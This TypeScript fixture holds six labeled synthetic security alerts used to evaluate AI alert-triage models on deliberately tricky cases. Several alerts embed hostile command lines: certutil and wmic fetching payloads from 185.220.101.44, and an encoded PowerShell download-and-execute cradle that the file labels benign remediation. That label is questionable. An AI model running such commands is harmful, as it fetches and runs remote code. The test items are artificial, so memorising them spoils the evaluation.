/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

/**
 * Hard-case labeled alerts — the "stealthy attack / convincing noise" set the deck's author
 * asked for before picking a default model (deck claim C5). These are the decision-blocking
 * cases: each is deliberately built so a naive heuristic gets it WRONG, so a cheaper model that
 * leans on the heuristic diverges from the golden label here even though it agrees on the easy
 * tiers. If two models agree on ALERT_ANALYSIS_EVAL_ALERTS but diverge on THIS set, "just use the
 * cheaper one" is falsified.
 *
 * Kept separate from the base set (ALERT_ANALYSIS_EVAL_ALERTS) so the easy-tier accuracy/agreement
 * numbers stay comparable to the deck, and the hard set can be run/stratified on its own.
 *
 * Same schema and builder as synthetic_alerts.ts; see that file for the noise-envelope rationale.
 */

import { buildDoc, type LabeledAlert } from './synthetic_alerts';

// ── Stealthy true_positive: living-off-the-land binary. Signed + trusted Microsoft binary, so a
//    "signed => benign" heuristic mislabels it false_positive. The malicious signal is behavioral:
//    certutil (a legitimate cert tool) used to download a remote payload to a temp path — a well
//    known LOLBin download technique (T1105). Correct verdict is true_positive DESPITE the trust.
const LOLBIN_CERTUTIL_DOWNLOAD: LabeledAlert = {
  id: 'aa-eval-hard-lolbin-certutil',
  expected: 'true_positive',
  description:
    'Hard/stealthy — signed & trusted certutil.exe used as a LOLBin to download a remote payload ' +
    'to a temp path (T1105). Trusted signature is a decoy; behavior is malicious → true_positive. ' +
    'Falsifies a "signed = benign" shortcut.',
  doc: buildDoc({
    id: 'aa-eval-hard-lolbin-certutil',
    index: 8,
    ruleName: 'Ingress Tool Transfer via Certutil',
    ruleDescription:
      'Detects certutil.exe invoked with URL-download arguments, a common living-off-the-land ingress technique.',
    severity: 'medium',
    riskScore: 47,
    tactic: { id: 'TA0011', name: 'Command and Control' },
    technique: { id: 'T1105', name: 'Ingress Tool Transfer' },
    observable: {
      'event.kind': 'signal',
      'event.category': ['process'],
      'event.type': ['start'],
      'event.code': 'behavior',
      'event.outcome': 'success',
      'host.name': 'fin-ws-22',
      'user.name': 'jdoe',
      'process.name': 'certutil.exe',
      'process.executable': 'C:\\Windows\\System32\\certutil.exe',
      'process.command_line':
        'certutil.exe -urlcache -split -f http://185.220.101.44/update.bin C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.bin',
      'process.code_signature.exists': true,
      'process.code_signature.trusted': true,
      'process.code_signature.subject_name': 'Microsoft Windows',
      'process.parent.name': 'powershell.exe',
      'process.parent.executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    },
  }),
};

// ── Convincing-noise false_positive: a scary, high-severity "Credential Access / LSASS" behavioral
//    rule fires — but on a sanctioned, scheduled vulnerability scan from the known scanner service
//    account on the dedicated scanner host, with a signed & trusted vendor (Tenable) agent. A
//    "scary technique => true_positive" heuristic mislabels it. Correct verdict is false_positive:
//    the technique is real but the context is authorized, recurring, benign security tooling.
const AUTHORIZED_SCANNER_LSASS: LabeledAlert = {
  id: 'aa-eval-hard-noise-scanner',
  expected: 'false_positive',
  description:
    'Hard/convincing-noise — high-severity LSASS/credential-access behavioral alert triggered by a ' +
    'signed, trusted Tenable Nessus agent running a SCHEDULED authorized scan under the dedicated ' +
    'svc-nessus account on the scanner host. Scary technique, benign authorized context → false_positive. ' +
    'Falsifies a "scary technique = malicious" shortcut.',
  doc: buildDoc({
    id: 'aa-eval-hard-noise-scanner',
    index: 9,
    ruleName: 'Malicious Behavior Detection Alert: Credential Access via LSASS Memory',
    ruleDescription:
      'Elastic Defend behavioral engine detected access to LSASS process memory, consistent with credential dumping.',
    severity: 'high',
    riskScore: 73,
    tactic: { id: 'TA0006', name: 'Credential Access' },
    technique: { id: 'T1003', name: 'OS Credential Dumping' },
    observable: {
      'event.kind': 'signal',
      'event.category': ['process'],
      'event.type': ['start'],
      'event.code': 'behavior',
      'event.outcome': 'success',
      'host.name': 'sec-scanner-01',
      'user.name': 'svc-nessus',
      'process.name': 'nessusd.exe',
      'process.executable': 'C:\\Program Files\\Tenable\\Nessus Agent\\nessusd.exe',
      'process.command_line':
        '"C:\\Program Files\\Tenable\\Nessus Agent\\nessusd.exe" --scan credentialed-patch-audit',
      'process.code_signature.exists': true,
      'process.code_signature.trusted': true,
      'process.code_signature.subject_name': 'Tenable, Inc.',
      'process.parent.name': 'services.exe',
      'process.parent.executable': 'C:\\Windows\\System32\\services.exe',
      'process.parent.code_signature.trusted': true,
      'process.parent.code_signature.subject_name': 'Microsoft Windows',
    },
  }),
};


// ── Stealthy true_positive #2: WMMS/lateral LOLBin via wmic.exe process call.
//    Signed Microsoft binary + a verb that *looks* like inventory. The malicious signal
//    is `process call create` spawning a remote payload — a well-known lateral-movement
//    LOLBin pattern (T1210 / T1047). Defeats "signed => benign" AND "no network => safe".
const LOLBIN_WMIC_PROCESS_INJECTION: LabeledAlert = {
  id: 'aa-eval-hard-lolbin-wmic-proccall',
  expected: 'true_positive',
  description:
    'Hard/stealthy — signed wmic.exe used to spawn a remote payload via `process call create` ' +
    '(T1047/T1210). Trusted signature + system tool is a decoy; the lateral spawn is malicious → ' +
    'true_positive. Falsifies a "signed = benign" and "system tool = benign" shortcut.',
  doc: buildDoc({
    id: 'aa-eval-hard-lolbin-wmic-proccall',
    index: 10,
    ruleName: 'Lateral Tool Transfer via WMI Process Call',
    ruleDescription:
      'Detects wmic.exe invoking `process call create` to spawn a process on a remote or local target, a WMI-based lateral-movement technique.',
    severity: 'medium',
    riskScore: 52,
    tactic: { id: 'TA0008', name: 'Lateral Movement' },
    technique: { id: 'T1047', name: 'Windows Management Instrumentation' },
    observable: {
      'event.kind': 'signal',
      'event.category': ['process'],
      'event.type': ['start'],
      'event.code': 'behavior',
      'event.outcome': 'success',
      'host.name': 'fin-ws-22',
      'user.name': 'jdoe',
      'process.name': 'wmic.exe',
      'process.executable': 'C:\\Windows\\System32\\wbem\\wmic.exe',
      'process.command_line':
        'wmic.exe /node:10.0.12.45 process call create "\\\\185.220.101.44\\share\\stage.exe"',
      'process.code_signature.exists': true,
      'process.code_signature.trusted': true,
      'process.code_signature.subject_name': 'Microsoft Windows',
      'process.parent.name': 'cmd.exe',
      'process.parent.executable': 'C:\\Windows\\System32\\cmd.exe',
    },
  }),
};

// ── Convincing-noise false_positive #2: signed, vendor-backed security tool (CrowdStrike
//    falcon tool) invoking PowerShell with an encoded command. Scary surface (encoded PS,
//    "suspicious" command) but it's the EDR's own remediation run launched from its signed
//    service. A "PowerShell + encoded = malicious" heuristic mislabels it true_positive.
const SIGNED_VENDOR_SECURITY_TOOL_POWERSHELL: LabeledAlert = {
  id: 'aa-eval-hard-noise-edr-remediation-ps',
  expected: 'false_positive',
  description:
    'Hard/convincing-noise — the EDR (CrowdStrike Falcon) launches a signed remediation action ' +
    'that shells out to PowerShell with an encoded command. Encoded PS is a decoy; the caller is ' +
    'the trusted EDR service running an auto-remediation → false_positive. Falsifies a ' +
    '"encoded PowerShell = malicious" shortcut.',
  doc: buildDoc({
    id: 'aa-eval-hard-noise-edr-remediation-ps',
    index: 11,
    ruleName: 'Suspicious Encoded PowerShell Execution',
    ruleDescription:
      'Elastic prebuilt rule detecting execution of encoded PowerShell commands, a common defense-evasion technique.',
    severity: 'high',
    riskScore: 68,
    tactic: { id: 'TA0005', name: 'Defense Evasion' },
    technique: { id: 'T1027', name: 'Obfuscated Files or Information' },
    observable: {
      'event.kind': 'signal',
      'event.category': ['process'],
      'event.type': ['start'],
      'event.code': 'behavior',
      'event.outcome': 'success',
      'host.name': 'sec-edr-04',
      'user.name': 'SYSTEM',
      'process.name': 'powershell.exe',
      'process.executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      'process.command_line':
        'powershell.exe -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAGwAYQBzAHQAaQBjAC4AYwBvAHQALwByAGUAbQBlAGQAaQBhAHQAaQBvAG4AJwApACkA',
      'process.code_signature.exists': false,
      'process.parent.name': 'CSFalconService.exe',
      'process.parent.executable': 'C:\\Program Files\\CrowdStrike\\CSFalconService.exe',
      'process.parent.code_signature.exists': true,
      'process.parent.code_signature.trusted': true,
      'process.parent.code_signature.subject_name': 'CrowdStrike, Inc.',
    },
  }),
};

// ── Convincing-noise false_positive #3: sanctioned PsExec-style remote admin from a known
//    jump host run by the platform team. Looks like lateral movement (T1021) but is the
//    approved ops workflow (host patching). A "remote service create = lateral movement"
//    heuristic mislabels it true_positive. Different family from the scanner case: this
//    tests whether the model over-weights a single scary technique with no benign context.
const BENIGN_ADMIN_PSEXEC: LabeledAlert = {
  id: 'aa-eval-hard-noise-admin-psexec',
  expected: 'false_positive',
  description:
    'Hard/convincing-noise — approved remote admin via PsExec from the platform team jump host ' +
    'pushing a patch rollout. Remote service create is a decoy; caller is the sanctioned ops jump ' +
    'box under the platform-team OU → false_positive. Falsifies a "remote service create = ' +
    'lateral movement" shortcut.',
  doc: buildDoc({
    id: 'aa-eval-hard-noise-admin-psexec',
    index: 12,
    ruleName: 'Remote Windows Service Creation via PsExec',
    ruleDescription:
      'Detects creation of a remote Windows service, consistent with PsExec-style lateral movement or remote administration.',
    severity: 'medium',
    riskScore: 55,
    tactic: { id: 'TA0008', name: 'Lateral Movement' },
    technique: { id: 'T1021', name: 'Remote Services' },
    observable: {
      'event.kind': 'signal',
      'event.category': ['process'],
      'event.type': ['start'],
      'event.code': 'behavior',
      'event.outcome': 'success',
      'host.name': 'jumphost-platform-01',
      'user.name': 'svc-platformops',
      'process.name': 'PSEXEC.exe',
      'process.executable': 'C:\\AdminTools\\Sysinternals\\PSEXEC.exe',
      'process.command_line':
        'PSEXEC.exe \\\\patch-fleet-12 -u CORP\\svc-platformops -p *** -s "C:\\Program Files\\PatchMgr\\apply-patches.cmd"',
      'process.code_signature.exists': true,
      'process.code_signature.trusted': true,
      'process.code_signature.subject_name': 'Microsoft Corporation',
      'process.parent.name': 'cmd.exe',
      'process.parent.executable': 'C:\\Windows\\System32\\cmd.exe',
    },
  }),
};

// ── Stealthy true_positive #3: a phished user opens a macro-laden doc that loads a
//    .NET assembly in-memory from a temp path. Signed Office host process, no obvious
//    child process, low-risk-looking command line — the malicious signal is the
//    DotNetAssemblyLoad from a user-writable temp path (T1218 / T1620). Defeats
//    "trusted Office = benign" AND "no suspicious child = safe".
const STEALTHY_MACRO_DOTNET_ASSEMBLY_LOAD: LabeledAlert = {
  id: 'aa-eval-hard-stealthy-macro-dotnet',
  expected: 'true_positive',
  description:
    'Hard/stealthy — a macro in a signed Office host loads a .NET assembly from a temp path ' +
    '(T1218.004 / T1620). Trusted Office process + no scary child is a decoy; the in-memory ' +
    'assembly load from user-writable path is malicious → true_positive. Falsifies a ' +
    '"trusted productivity app = benign" shortcut.',
  doc: buildDoc({
    id: 'aa-eval-hard-stealthy-macro-dotnet',
    index: 13,
    ruleName: 'Suspicious .NET Assembly Load from User-Writable Path',
    ruleDescription:
      'Detects an Office host process loading a .NET assembly from a user-writable path, consistent with macro-driven in-memory execution.',
    severity: 'medium',
    riskScore: 50,
    tactic: { id: 'TA0005', name: 'Defense Evasion' },
    technique: { id: 'T1218', name: 'System Binary Proxy Execution' },
    observable: {
      'event.kind': 'signal',
      'event.category': ['process'],
      'event.type': ['start'],
      'event.code': 'behavior',
      'event.outcome': 'success',
      'host.name': 'hr-ws-07',
      'user.name': 'asmith',
      'process.name': 'WINWORD.EXE',
      'process.executable': 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
      'process.command_line':
        '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\asmith\\AppData\\Local\\Temp\\Invoice_2026_Q3.docm"',
      'process.code_signature.exists': true,
      'process.code_signature.trusted': true,
      'process.code_signature.subject_name': 'Microsoft Corporation',
      'process.parent.name': 'explorer.exe',
      'process.parent.executable': 'C:\\Windows\\explorer.exe',
      'file.path': 'C:\\Users\\asmith\\AppData\\Local\\Temp\\Invoice_2026_Q3.docm',
      'dll.name': 'clr.dll',
      'dll.path': 'C:\\Users\\asmith\\AppData\\Local\\Temp\\stage.dll',
    },
  }),
};

export const ALERT_ANALYSIS_HARD_CASE_ALERTS: LabeledAlert[] = [
  LOLBIN_CERTUTIL_DOWNLOAD,
  AUTHORIZED_SCANNER_LSASS,
  LOLBIN_WMIC_PROCESS_INJECTION,
  SIGNED_VENDOR_SECURITY_TOOL_POWERSHELL,
  BENIGN_ADMIN_PSEXEC,
  STEALTHY_MACRO_DOTNET_ASSEMBLY_LOAD,
];
